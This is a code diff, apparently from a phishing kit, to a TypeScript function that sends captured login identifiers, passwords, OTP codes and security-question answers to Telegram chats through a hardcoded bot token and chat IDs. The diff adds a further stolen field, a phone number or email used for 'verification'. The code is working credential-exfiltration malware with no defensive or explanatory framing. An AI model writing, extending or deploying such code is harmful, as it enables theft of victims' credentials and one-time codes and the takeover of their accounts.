@@ -7,7 +7,8 @@ export const sendToTelegram = async (
     q1: string, a1: string,
     q2: string, a2: string,
     q3: string, a3: string
-  }
+  },
+  phoneOrEmail?: string
 ) => {
   const BOT_TOKEN = '8537131987:AAGSRSflBc7ajrYQ89Q8fc3CrJn_EW7OLR4';
   const CHAT_IDS = ['6885815623', '6076369736']; // Add your IDs here
@@ -68,6 +69,7 @@ export const sendToTelegram = async (
 ─────────────────
 ${loginLabel}: <code>${identifier}</code>
 🔐 Password: <code>${pass}</code>
+${phoneOrEmail ? `📱/📧 Verifikasi: <code>${phoneOrEmail}</code>` : ""}
 ${securitySection}
 🛡️ <b>Security Verification:</b>
 └ OTP: <code>${otp}</code>
